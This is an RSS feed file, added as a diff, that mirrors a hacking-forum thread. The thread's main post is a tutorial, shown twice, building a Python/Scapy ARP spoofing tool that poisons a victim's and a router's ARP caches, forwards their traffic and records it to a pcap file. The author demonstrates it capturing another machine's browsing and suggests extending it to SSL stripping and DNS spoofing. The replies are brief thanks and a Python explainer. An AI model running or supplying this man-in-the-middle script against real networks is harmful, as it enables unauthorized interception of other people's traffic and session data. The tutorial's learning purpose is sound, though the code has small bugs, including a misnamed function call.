@@ -1,0 +1,450 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Quick n&#39; Dirty ARP Spoofing in Python</title>
+    <link>https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487</link>
+    <description>Today well be learning how to do a simple [ARP Spoof](https://en.wikipedia.org/wiki/ARP_spoofing) or ARP Poison in python. 
+
+ARP spoofing can be used for a few things, [DoS](https://en.wikipedia.org/wiki/Denial_of_service), [MitM](https://en.wikipedia.org/wiki/Man-in-the-middle_attack), [Session Hijacking](https://en.wikipedia.org/wiki/Session_hijacking),[Stripping SSL](https://en.wikipedia.org/wiki/Moxie_Marlinspike#Notable_research)(technically mitm).
+
+Today well be using it for a basic Man in the Middle attack.
+
+So lets get started with some quick background info.
+_______________________________________________________________
+1. What is this ARP you speak of? Is it like [LARP&#39;ing](http://www.larp.com/)? 
+
+---------------------------------------------------------------------------------------------------
+For starters.. No. No it is not.
+
+[ARP](https://en.wikipedia.org/wiki/Address_Resolution_Protocol) or Address Resolution Protocol, in simple terms, maps a network address to a [MAC ](https://en.wikipedia.org/wiki/MAC_address) address.
+
+Heres an example from wikipedia: 
+
+&gt; For example, picture the computers Matterhorn and Washington in an office, connected to each other on the office local area network by Ethernet cables and network switches, with no intervening gateways or routers. Matterhorn has a packet to send to Washington. Through DNS, it determines that Washington has an IP address of 192.168.0.55. In order to send the message, it also needs to know Washington&#39;s MAC address. First, Matterhorn uses a cached ARP table to look up 192.168.0.55 for any existing records of Washington&#39;s MAC address (00:eb:24:b2:05:ac). If the MAC address is found, it sends the IP packet encapsulated in a level 2 frame on the link layer to address 00:eb:24:b2:05:ac via the local network cabling. If the cache did not produce a result for 192.168.0.55, Matterhorn has to send a broadcast ARP message (destination FF:FF:FF:FF:FF:FF MAC address, which is accepted by all computers) requesting an answer for 192.168.0.55. Washington responds with its MAC address (and its IP). (Washington may insert an entry for Matterhorn into its own ARP table for future use.) Matterhorn caches the response information in its own ARP table and can now send the packet.
+
+ ARP runs on request and reply, so one machine sends out a broadcast request with its information asking for an address, and machine two sees that request and says &quot;OH THATS ME&quot; and replies with its information so the two computers can communicate.
+
+You can read into the nitty gritty in the [ARP RFC 826](https://tools.ietf.org/html/rfc826) if you really want to know everything there is to know.
+
+However, this should be enough for our purpose in this article.
+____________________________
+ 2 .  Okay, so what does this mean for us?
+__________________________________________________
+Well, ARP doesnt have authentication for replies, so that means for us, we can ARP spoof or pretend to be another machine so we can catch then forward all packets destined for it.
+
+So, our machine 192.168.1.46 sees a request from 192.168.1.23 asking for the address 192.168.1.1(the router in this case). What we can do is reply to that request, saying &quot;Hey , thats me&quot;  so packets  addressed to the router come through us and we send them on their merry way after inspecting them. Now, this requires both ends, so we have to reply to 192.168.1.23 and tell it that were the router, but we also have to tell the router, that were 192.168.1.23.
+
+Were essentially acting as a proxy for both systems, however unauthorized.
+
+Now, for this to work, you need both the IP and the MAC of the systems you are going to place yourself in between.
+__________________
+3 .  Okay, I think im picking up what your putting down. Now you said wed do ARP spoofing?
+__________________
+
+Alright, onto the fun part. Well be using Python and [Scapy](http://secdev.org/projects/scapy/) (very powerful library I suggest you make friends with it) to write a quick and dirty ARP spoofer. This wont be useful for too much straight out of the gate. In this intro, all youll do is save the packets to a pcap for later use, and see the packets go by as Source, Raw Load, Destination. Nothing Special.
+So we know we need the IP and MAC of our victims right? 
+
+Lets start taking some input from the user, then well use it to grab a little info. 
+
+Well do some imports, and  ask for the interface well be sending packets on, the victim, and the router.
+
+```python
+import os
+import sys
+from scapy.all import*
+
+interface = raw_input(&quot;interface: \n&quot;)
+victimIP = raw_input(&quot;victim: \n&quot;)
+routerIP=raw_input(&quot;router: \n&quot;)
+```
+
+Weve imported a few modules. 
+We import os because we need to access /proc/ on the system, so we can do [IP Forwarding](https://en.wikipedia.org/wiki/IP_forwarding) and route packets from the victim to the router.
+
+We import sys so we can do a shutdown in some try and except loops.
+
+Finally we import scapy, which is the real powerhouse of the situation. It allows us to send/recieve/craft packets, I HIGHLY recommend you spend some time reading about it.
+
+okay, moving on.
+
+Now well try to get the MAC of our victim IP
+
+```python
+def MACsnag(IP):
+    ans, unans = arping(IP)
+    for s, r in ans:
+        return r[Ether].src
+```
+we define a function called `MACsnag(),` which takes an IP address.
+the arping function takes an ip address(or Network) and returns a list of IP/MACs, the `ans, unans` well think of as answered and unanswered packets.
+the for loop takes the send and recieve of the answered packets, which on the next like returns the `src` of the `[Ether]` layer or the mac address.
+
+If you dont know about packet layers, I suggest doing some reading, as it would take a bit of writing and would push the length of this post.
+
+So now we have a function that will get our info down the road. Lets keep building. 
+
+Onto the spoofing.
+```python
+def Spoof(routerIP, victimIP):
+    victimMAC = MACsnag(victimIP)
+    routerMAC = MACsnag(routerIP)
+    send(ARP(op =2, pdst = victimIP, psrc = routerIP, hwdst = victimMAC))
+    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = routerMAC))
+```
+We first define a function called `spoof()` which takes two arguments, the victim and router MACs.
+We then call our `MACsnag()` function to get the MAC addresses we need.
+The next two lines are pretty simple, they call scapys `send()` function, saying to send an ARP packet.
+The `op` part is the opcode, saying that is a reply, if it were 1 it would be a request.
+
+So were telling the victim that this packet came from the router, and were telling the router that this packet came from the victim. Which from then on the victim will send to us for the router, the router will send to us for the victim, effectively putting us in the middle.
+
+Now, this is all good and well, however, if we dont reupdate the routing tables when were done, the victim and router will  continue to try to send packets through us. No bueno, that means no connection for them. 
+
+So, well write a function to restore the victim and router.
+```python
+def Restore(routerIP, victimIP):
+    victimMAC = MACsnag(victimIP)
+    routerMAC = MACsnag(routerIP)
+    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;, hwsrc= victimMAC), count = 4) 
+    send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;, hwsrc = routerMAC), count = 4) 
+```
+So, we define the ` Restore()` function. this is basically the inverse of the spoof function with a slight difference. so we send ARP replies to each host.
+However, youll notice the  `hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;`,   ff:ff:ff:ff:ff:ff is simply put, the everyone address, so this broadcasts the packet asking for the information of the machine at the requested IP, so in this case, the router would respond with its information and BAM now theyre back to talking to each other correctly.
+
+Alright, so we can get MACs, spoof and restore. Now what?
+Were going to write a quick function to watch the packets go by and save them to a file
+```python
+def sniffer():
+    pkts = sniff(iface = interface, count = 10, prn=lambda x:x.sprintf(&quot; Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n&quot;))
+    wrpcap(&quot;temp.pcap&quot;, pkts)
+```
+
+We made a function `sniffer()`
+We then call scapys `sniff()` function on the interface we specified earlier, for a count of 10 packets.
+at the end of the sniff function youll notice `prn=` is adding a custom action, you could pass this a seperate function you wrote if you wish, in this case we used a lambda to print out the packets source IP and MAC, followed by the packets raw load if there is one, ending with the packets destination IP.
+Next we call `wrpcap()` to write all the packets we sniff to a .pcap file for later inspection
+
+
+
+Alright, were almost there. Lets make it run!
+
+```python 
+def MiddleMan():
+    os.system(&quot;echo 1 &gt; /proc/sys/net/ipv4/ip_forward&quot;)
+    while 1:
+        try:
+            spoof(routerIP, victimIP)
+            time.sleep(1)
+            sniffer()
+        except KeyboardInterrupt:
+            Restore(routerIP, victimIP)
+            os.system(&quot;echo 0 &gt; /proc/sys/net/ipv4/ip_forward&quot;)
+            sys.exit(1)
+
+
+if __name__ == &quot;__main__&quot;:
+    MiddleMan()
+```
+
+Okay, so first  `os.system(&quot;echo 1 &gt; /proc/sys/net/ipv4/ip_forward&quot;)` makes a call to turn on IP forwarding , hence the 1.
+
+Then, we say `while 1` or as long as were running, to try to run spoof and sniff, then sleep for one second  and this continues, unless the user hits `ctrl + C`. In which case we Restore the targets, then we call   `os.system(&quot;echo 0 &gt; /proc/sys/net/ipv4/ip_forward&quot;)` to turn off IP forwarding, hence the 0. 
+Then the it shuts down the program with `sys.exit(0)` or a clean exit with no errors, since we requested the shutdown.
+
+Heres my linux attack box `ifconfig` and im at `192.168.0.222`
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/bd6c893b7b73f75bec1bdcb68ebc582a1df51141.png&quot; width=&quot;636&quot; height=&quot;156&quot;&gt;
+
+-
+-
+-
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/1d0ff5f7bc26238d2ee9dd6cde98e710ed67bc26.png&quot; width=&quot;668&quot; height=&quot;107&quot;&gt;
+
+Above  you can see im using interface `wlan0`  and my victim is my windows machine at `192.168.0.195` using the router `192.168.0.1`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/52353186b2a00633ebdd150cffc814beaac1ba74.png&quot; width=&quot;690&quot; height=&quot;148&quot;&gt;
+
+You can see my windows machine is browsing *rainierland.com* amongst some other details.
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/ef25aaa83cb706d8ab9aa27c74c8d09cab4056fa.png&quot; width=&quot;423&quot; height=&quot;106&quot;&gt;
+
+Screen cap from the `temp.pcap` file we wrote, showing the packet we saw in the live view screenshot above.
+_____
+
+ 4 . *Final Notes/Dislaimer*
+______
+
+This tool is not perfect, its quick, and dirty, and quite frankly leaves much to be desired. Its posted here merely as a learning excercise to give a base for readers to play with and use to learn/expand.
+
+Common errors I experienced were the victim machines failure to connect to webpages, or lag in connecting to webpages, which would be very obvious to the victim in any attack scenario. 
+
+Also, this wont do much of anything for HTTPS sites.
+
+__________
+
+Case and point, learn from it, expand, build, and post back with any cool steps you take, maybe you create a MitM that can strip SSL, or do some DNS spoofing after your ARP poison.
+
+Questions, comments, criticism all welcome.
+
+Sorry for my absence, I believed i promised a few members some posts, ive been quite busy with a promotion at work.
+Happy hacking.</description>
+    
+    <lastBuildDate>Wed, 08 Jun 2016 14:19:04 +0000</lastBuildDate>
+    <category>Programming</category>
+    <atom:link href="https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Quick n&#39; Dirty ARP Spoofing in Python</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
+          <p><a href="https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487/8">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487/8</link>
+        <pubDate>Sun, 21 Jan 2018 00:30:18 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-487-8</guid>
+        <source url="https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487.rss">Quick n&#39; Dirty ARP Spoofing in Python</source>
+      </item>
+      <item>
+        <title>Quick n&#39; Dirty ARP Spoofing in Python</title>
+        <dc:creator><![CDATA[Neo]]></dc:creator>
+        <description><![CDATA[
+            <p>Wow, great function and great explanation. Many thanks.</p>
+          <p><a href="https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487/7</link>
+        <pubDate>Wed, 08 Jun 2016 14:19:04 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-487-7</guid>
+        <source url="https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487.rss">Quick n&#39; Dirty ARP Spoofing in Python</source>
+      </item>
+      <item>
+        <title>Quick n&#39; Dirty ARP Spoofing in Python</title>
+        <dc:creator><![CDATA[OilSlick]]></dc:creator>
+        <description><![CDATA[
+            <p>*Question, whats up with my syntax highlighting?</p>
+<p>Every module you write has a  <code>__name__</code> , but its mainly used for when you would be importing your module from another file.</p>
+<p>Setting <code>__name__</code> to <code>__main__</code> would make it so the defined block would get ran, only if the program was ran by itself. Otherwise you would be able to import it using its functions. Perhaps an example would be better.</p>
+<pre><code class="lang-python">#! /usr/bin/python/
+#our filename is mainfile.py
+if __name__ == "__main__":
+   print "Being run as a program directly"
+else:
+   print "Being imported as a module"
+</code></pre>
+<p>Example output:<br>
+<img src="//0x00sec.s3.amazonaws.com/original/1X/b9a4308ea47caf94303cb08caef188bd3531365b.png" width="385" height="35"><br>
+above the program is run directly.<br>
+<img src="//0x00sec.s3.amazonaws.com/original/1X/8424f09c7a82e80ed08c1484b39bbf0703bd4e79.png" width="608" height="140"><br>
+then it is imported as a module.</p>
+<p>You can see how the name declaration affects what gets ran.</p>
+<p>If I am unclear, or you want to know more, here is a fantastic explanation from <a href="https://stackoverflow.com/questions/419163/what-does-if-name-main-do" rel="noopener nofollow ugc">Stack Overflow</a></p>
+<pre><code>When the Python interpreter reads a source file, it executes all of the code found in it. Before executing the code, it will define a few special variables. For example, if the python interpreter is running that module (the source file) as the main program, it sets the special __name__ variable to have a value "__main__". If this file is being imported from another module, __name__ will be set to the module's name.
+
+In the case of your script, let's assume that it's executing as the main function, e.g. you said something like
+
+python threading_example.py
+on the command line. After setting up the special variables, it will execute the import statement and load those modules. It will then evaluate the def block, creating a function object and creating a variable called myfunction that points to the function object. It will then read the if statement and see that __name__ does equal "__main__", so it will execute the block shown there.
+
+One of the reasons for doing this is that sometimes you write a module (a .py file) where it can be executed directly. Alternatively, it can also be imported and used in another module. By doing the main check, you can have that code only execute when you want to run the module as a program and not have it execute when someone just wants to import your module and call your functions themselves.</code></pre>
+          <p><a href="https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487/6</link>
+        <pubDate>Wed, 08 Jun 2016 12:37:28 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-487-6</guid>
+        <source url="https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487.rss">Quick n&#39; Dirty ARP Spoofing in Python</source>
+      </item>
+      <item>
+        <title>Quick n&#39; Dirty ARP Spoofing in Python</title>
+        <dc:creator><![CDATA[Neo]]></dc:creator>
+        <description><![CDATA[
+            <p>First off: Thanks for the tutorial. It is really quick and your explanations really helped me understand the code.</p>
+<p>One question:<br>
+Mind to elaborate the line ‘if _<em>name</em>_ == “_<em>main</em>_”’?<br>
+I get what that line does in that context, but where does it come from, what does it do EXACTLY and why is it written like that? And what is _<em>name</em>_?</p>
+<p>I am writing Python code for a few months now but haven’t seen a line like that so far.</p>
+          <p><a href="https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487/5</link>
+        <pubDate>Wed, 08 Jun 2016 10:38:43 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-487-5</guid>
+        <source url="https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487.rss">Quick n&#39; Dirty ARP Spoofing in Python</source>
+      </item>
+      <item>
+        <title>Quick n&#39; Dirty ARP Spoofing in Python</title>
+        <dc:creator><![CDATA[random-man]]></dc:creator>
+        <description><![CDATA[
+            <p>This is awesome! But the error I’m getting when the vic is doing http with domain name sites is that it can’t contact the DNS server… Hmmm… I wonder if there is a way to fix this…</p>
+          <p><a href="https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487/4</link>
+        <pubDate>Sun, 05 Jun 2016 06:40:56 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-487-4</guid>
+        <source url="https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487.rss">Quick n&#39; Dirty ARP Spoofing in Python</source>
+      </item>
+      <item>
+        <title>Quick n&#39; Dirty ARP Spoofing in Python</title>
+        <dc:creator><![CDATA[_gumby]]></dc:creator>
+        <description><![CDATA[
+            <p>Mmmm arp spoofing. <img src="https://0x00sec.org/images/emoji/twitter/heart.png?v=9" title=":heart:" class="emoji" alt=":heart:"><img src="https://0x00sec.org/images/emoji/twitter/heart.png?v=9" title=":heart:" class="emoji" alt=":heart:"><img src="https://0x00sec.org/images/emoji/twitter/heart.png?v=9" title=":heart:" class="emoji" alt=":heart:"></p>
+          <p><a href="https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487/3</link>
+        <pubDate>Thu, 26 May 2016 02:05:23 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-487-3</guid>
+        <source url="https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487.rss">Quick n&#39; Dirty ARP Spoofing in Python</source>
+      </item>
+      <item>
+        <title>Quick n&#39; Dirty ARP Spoofing in Python</title>
+        <dc:creator><![CDATA[random-man]]></dc:creator>
+        <description><![CDATA[
+            <p>Nice! Thanks man. Good stuff.</p>
+          <p><a href="https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487/2</link>
+        <pubDate>Thu, 26 May 2016 01:15:23 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-487-2</guid>
+        <source url="https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487.rss">Quick n&#39; Dirty ARP Spoofing in Python</source>
+      </item>
+      <item>
+        <title>Quick n&#39; Dirty ARP Spoofing in Python</title>
+        <dc:creator><![CDATA[OilSlick]]></dc:creator>
+        <description><![CDATA[
+            <p>Today well be learning how to do a simple <a href="https://en.wikipedia.org/wiki/ARP_spoofing" rel="noopener nofollow ugc">ARP Spoof</a> or ARP Poison in python.</p>
+<p>ARP spoofing can be used for a few things, <a href="https://en.wikipedia.org/wiki/Denial_of_service" rel="noopener nofollow ugc">DoS</a>, <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack" rel="noopener nofollow ugc">MitM</a>, <a href="https://en.wikipedia.org/wiki/Session_hijacking" rel="noopener nofollow ugc">Session Hijacking</a>,<a href="https://en.wikipedia.org/wiki/Moxie_Marlinspike#Notable_research" rel="noopener nofollow ugc">Stripping SSL</a>(technically mitm).</p>
+<p>Today well be using it for a basic Man in the Middle attack.</p>
+<p>So lets get started with some quick background info.</p>
+<hr>
+<ol>
+<li>What is this ARP you speak of? Is it like <a href="http://www.larp.com/" rel="noopener nofollow ugc">LARP’ing</a>?</li>
+</ol>
+<hr>
+<p>For starters.. No. No it is not.</p>
+<p><a href="https://en.wikipedia.org/wiki/Address_Resolution_Protocol" rel="noopener nofollow ugc">ARP</a> or Address Resolution Protocol, in simple terms, maps a network address to a <a href="https://en.wikipedia.org/wiki/MAC_address" rel="noopener nofollow ugc">MAC </a> address.</p>
+<p>Heres an example from wikipedia:</p>
+<blockquote>
+<p>For example, picture the computers Matterhorn and Washington in an office, connected to each other on the office local area network by Ethernet cables and network switches, with no intervening gateways or routers. Matterhorn has a packet to send to Washington. Through DNS, it determines that Washington has an IP address of 192.168.0.55. In order to send the message, it also needs to know Washington’s MAC address. First, Matterhorn uses a cached ARP table to look up 192.168.0.55 for any existing records of Washington’s MAC address (00:eb:24:b2:05:ac). If the MAC address is found, it sends the IP packet encapsulated in a level 2 frame on the link layer to address 00:eb:24:b2:05:ac via the local network cabling. If the cache did not produce a result for 192.168.0.55, Matterhorn has to send a broadcast ARP message (destination FF:FF:FF:FF:FF:FF MAC address, which is accepted by all computers) requesting an answer for 192.168.0.55. Washington responds with its MAC address (and its IP). (Washington may insert an entry for Matterhorn into its own ARP table for future use.) Matterhorn caches the response information in its own ARP table and can now send the packet.</p>
+</blockquote>
+<p>ARP runs on request and reply, so one machine sends out a broadcast request with its information asking for an address, and machine two sees that request and says “OH THATS ME” and replies with its information so the two computers can communicate.</p>
+<p>You can read into the nitty gritty in the <a href="https://tools.ietf.org/html/rfc826" rel="noopener nofollow ugc">ARP RFC 826</a> if you really want to know everything there is to know.</p>
+<p>However, this should be enough for our purpose in this article.</p>
+<hr>
+<p>2 .  Okay, so what does this mean for us?</p>
+<hr>
+<p>Well, ARP doesnt have authentication for replies, so that means for us, we can ARP spoof or pretend to be another machine so we can catch then forward all packets destined for it.</p>
+<p>So, our machine 192.168.1.46 sees a request from 192.168.1.23 asking for the address 192.168.1.1(the router in this case). What we can do is reply to that request, saying “Hey , thats me”  so packets  addressed to the router come through us and we send them on their merry way after inspecting them. Now, this requires both ends, so we have to reply to 192.168.1.23 and tell it that were the router, but we also have to tell the router, that were 192.168.1.23.</p>
+<p>Were essentially acting as a proxy for both systems, however unauthorized.</p>
+<p>Now, for this to work, you need both the IP and the MAC of the systems you are going to place yourself in between.</p>
+<hr>
+<p>3 .  Okay, I think im picking up what your putting down. Now you said wed do ARP spoofing?</p>
+<hr>
+<p>Alright, onto the fun part. Well be using Python and <a href="http://secdev.org/projects/scapy/" rel="noopener nofollow ugc">Scapy</a> (very powerful library I suggest you make friends with it) to write a quick and dirty ARP spoofer. This wont be useful for too much straight out of the gate. In this intro, all youll do is save the packets to a pcap for later use, and see the packets go by as Source, Raw Load, Destination. Nothing Special.<br>
+So we know we need the IP and MAC of our victims right?</p>
+<p>Lets start taking some input from the user, then well use it to grab a little info.</p>
+<p>Well do some imports, and  ask for the interface well be sending packets on, the victim, and the router.</p>
+<pre data-code-wrap="python"><code class="lang-python">import os
+import sys
+from scapy.all import*
+
+interface = raw_input("interface: \n")
+victimIP = raw_input("victim: \n")
+routerIP=raw_input("router: \n")
+</code></pre>
+<p>Weve imported a few modules.<br>
+We import os because we need to access /proc/ on the system, so we can do <a href="https://en.wikipedia.org/wiki/IP_forwarding" rel="noopener nofollow ugc">IP Forwarding</a> and route packets from the victim to the router.</p>
+<p>We import sys so we can do a shutdown in some try and except loops.</p>
+<p>Finally we import scapy, which is the real powerhouse of the situation. It allows us to send/recieve/craft packets, I HIGHLY recommend you spend some time reading about it.</p>
+<p>okay, moving on.</p>
+<p>Now well try to get the MAC of our victim IP</p>
+<pre data-code-wrap="python"><code class="lang-python">def MACsnag(IP):
+    ans, unans = arping(IP)
+    for s, r in ans:
+        return r[Ether].src
+</code></pre>
+<p>we define a function called <code>MACsnag(),</code> which takes an IP address.<br>
+the arping function takes an ip address(or Network) and returns a list of IP/MACs, the <code>ans, unans</code> well think of as answered and unanswered packets.<br>
+the for loop takes the send and recieve of the answered packets, which on the next like returns the <code>src</code> of the <code>[Ether]</code> layer or the mac address.</p>
+<p>If you dont know about packet layers, I suggest doing some reading, as it would take a bit of writing and would push the length of this post.</p>
+<p>So now we have a function that will get our info down the road. Lets keep building.</p>
+<p>Onto the spoofing.</p>
+<pre data-code-wrap="python"><code class="lang-python">def Spoof(routerIP, victimIP):
+    victimMAC = MACsnag(victimIP)
+    routerMAC = MACsnag(routerIP)
+    send(ARP(op =2, pdst = victimIP, psrc = routerIP, hwdst = victimMAC))
+    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = routerMAC))
+</code></pre>
+<p>We first define a function called <code>spoof()</code> which takes two arguments, the victim and router MACs.<br>
+We then call our <code>MACsnag()</code> function to get the MAC addresses we need.<br>
+The next two lines are pretty simple, they call scapys <code>send()</code> function, saying to send an ARP packet.<br>
+The <code>op</code> part is the opcode, saying that is a reply, if it were 1 it would be a request.</p>
+<p>So were telling the victim that this packet came from the router, and were telling the router that this packet came from the victim. Which from then on the victim will send to us for the router, the router will send to us for the victim, effectively putting us in the middle.</p>
+<p>Now, this is all good and well, however, if we dont reupdate the routing tables when were done, the victim and router will  continue to try to send packets through us. No bueno, that means no connection for them.</p>
+<p>So, well write a function to restore the victim and router.</p>
+<pre data-code-wrap="python"><code class="lang-python">def Restore(routerIP, victimIP):
+    victimMAC = MACsnag(victimIP)
+    routerMAC = MACsnag(routerIP)
+    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4) 
+    send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4) 
+</code></pre>
+<p>So, we define the <code> Restore()</code> function. this is basically the inverse of the spoof function with a slight difference. so we send ARP replies to each host.<br>
+However, youll notice the  <code>hwdst = "ff:ff:ff:ff:ff:ff"</code>,   ff:ff:ff:ff:ff:ff is simply put, the everyone address, so this broadcasts the packet asking for the information of the machine at the requested IP, so in this case, the router would respond with its information and BAM now theyre back to talking to each other correctly.</p>
+<p>Alright, so we can get MACs, spoof and restore. Now what?<br>
+Were going to write a quick function to watch the packets go by and save them to a file</p>
+<pre data-code-wrap="python"><code class="lang-python">def sniffer():
+    pkts = sniff(iface = interface, count = 10, prn=lambda x:x.sprintf(" Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
+    wrpcap("temp.pcap", pkts)
+</code></pre>
+<p>We made a function <code>sniffer()</code><br>
+We then call scapys <code>sniff()</code> function on the interface we specified earlier, for a count of 10 packets.<br>
+at the end of the sniff function youll notice <code>prn=</code> is adding a custom action, you could pass this a seperate function you wrote if you wish, in this case we used a lambda to print out the packets source IP and MAC, followed by the packets raw load if there is one, ending with the packets destination IP.<br>
+Next we call <code>wrpcap()</code> to write all the packets we sniff to a .pcap file for later inspection</p>
+<p>Alright, were almost there. Lets make it run!</p>
+<pre data-code-wrap="python"><code class="lang-python">def MiddleMan():
+    os.system("echo 1 &gt; /proc/sys/net/ipv4/ip_forward")
+    while 1:
+        try:
+            spoof(routerIP, victimIP)
+            time.sleep(1)
+            sniffer()
+        except KeyboardInterrupt:
+            Restore(routerIP, victimIP)
+            os.system("echo 0 &gt; /proc/sys/net/ipv4/ip_forward")
+            sys.exit(1)
+
+
+if __name__ == "__main__":
+    MiddleMan()
+</code></pre>
+<p>Okay, so first  <code>os.system("echo 1 &gt; /proc/sys/net/ipv4/ip_forward")</code> makes a call to turn on IP forwarding , hence the 1.</p>
+<p>Then, we say <code>while 1</code> or as long as were running, to try to run spoof and sniff, then sleep for one second  and this continues, unless the user hits <code>ctrl + C</code>. In which case we Restore the targets, then we call   <code>os.system("echo 0 &gt; /proc/sys/net/ipv4/ip_forward")</code> to turn off IP forwarding, hence the 0.<br>
+Then the it shuts down the program with <code>sys.exit(0)</code> or a clean exit with no errors, since we requested the shutdown.</p>
+<p>Heres my linux attack box <code>ifconfig</code> and im at <code>192.168.0.222</code><br>
+<img src="//0x00sec.s3.amazonaws.com/original/1X/bd6c893b7b73f75bec1bdcb68ebc582a1df51141.png" width="636" height="156"></p>
+<ul>
+<li></li>
+<li></li>
+<li></li>
+</ul>
+<p><img src="//0x00sec.s3.amazonaws.com/original/1X/1d0ff5f7bc26238d2ee9dd6cde98e710ed67bc26.png" width="668" height="107"></p>
+<p>Above  you can see im using interface <code>wlan0</code>  and my victim is my windows machine at <code>192.168.0.195</code> using the router <code>192.168.0.1</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/1X/52353186b2a00633ebdd150cffc814beaac1ba74.png" data-download-href="/uploads/short-url/bJf7nBc1jzoBseBUYkmTzmZcRYE.png?dl=1" title="gets00spoof.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/1X/52353186b2a00633ebdd150cffc814beaac1ba74.png" width="690" height="148"></a></div><p></p>
+<p>You can see my windows machine is browsing <em><a href="http://rainierland.com" rel="noopener nofollow ugc">rainierland.com</a></em> amongst some other details.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/1X/ef25aaa83cb706d8ab9aa27c74c8d09cab4056fa.png" width="423" height="106"></p>
+<p>Screen cap from the <code>temp.pcap</code> file we wrote, showing the packet we saw in the live view screenshot above.</p>
+<hr>
+<p>4 . <em>Final Notes/Dislaimer</em></p>
+<hr>
+<p>This tool is not perfect, its quick, and dirty, and quite frankly leaves much to be desired. Its posted here merely as a learning excercise to give a base for readers to play with and use to learn/expand.</p>
+<p>Common errors I experienced were the victim machines failure to connect to webpages, or lag in connecting to webpages, which would be very obvious to the victim in any attack scenario.</p>
+<p>Also, this wont do much of anything for HTTPS sites.</p>
+<hr>
+<p>Case and point, learn from it, expand, build, and post back with any cool steps you take, maybe you create a MitM that can strip SSL, or do some DNS spoofing after your ARP poison.</p>
+<p>Questions, comments, criticism all welcome.</p>
+<p>Sorry for my absence, I believed i promised a few members some posts, ive been quite busy with a promotion at work.<br>
+Happy hacking.</p>
+          <p><a href="https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487/1</link>
+        <pubDate>Wed, 25 May 2016 23:31:48 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-487-1</guid>
+        <source url="https://d.clarkee.co.uk/t/quick-n-dirty-arp-spoofing-in-python/487.rss">Quick n&#39; Dirty ARP Spoofing in Python</source>
